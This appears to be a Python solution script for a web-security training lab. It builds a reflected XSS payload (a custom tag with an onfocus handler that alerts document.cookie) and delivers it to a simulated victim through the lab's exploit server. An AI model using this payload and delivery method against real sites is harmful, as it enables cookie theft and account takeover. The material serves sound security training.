import requests
import webbrowser


exploit_server = 'https://exploit-serverID.exploit-server.net/' # Replace with your actual Exploit Server ID
lab_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
payload = f"""
<script>
location = '{lab_url}?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex%3D1%3E#x';
</script>
"""

data = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
    "responseBody": payload,
    "formAction": "DELIVER_TO_VICTIM"
}

response = requests.post(url=exploit_server, data=data)
deliver_url = exploit_server + "deliver-to-victim"
response_deliver = requests.get(deliver_url)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(exploit_server)
    webbrowser.open(exploit_server)
else:
    print("Something went wrong.")